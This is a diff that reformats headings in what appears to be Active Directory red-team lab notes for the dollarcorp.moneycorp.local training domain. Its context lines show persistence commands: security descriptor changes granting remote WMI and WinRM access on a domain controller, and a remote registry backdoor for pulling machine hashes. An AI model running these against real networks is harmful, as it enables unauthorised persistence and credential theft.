@@ -160,7 +160,7 @@ Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -Pr
 ```
 # Modify Security Descriptor WMI
 
-Give user right to execute remotely WMI
+### Give user right to execute remotely WMI
 
 ```
 Set-RemoteWMI -UserName <user> -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
@@ -171,7 +171,7 @@ gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.lo
 ```
 
 
-Give access to winrm PS console to a user
+### Give access to winrm PS console to a user
 ```
 Set-RemotePSRemoting -UserName <user> -ComputerName <remotehost> -Verb
 ```
@@ -180,7 +180,7 @@ exec:
 Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
 
-Retrieve Hash machine without Domain Admin right
+### Retrieve Hash machine without Domain Admin right
 ```
 Add-RemoteRegBackdoor -ComputerName <FQDN-MACHINE> -Trustee <user> -Verbose
 ```
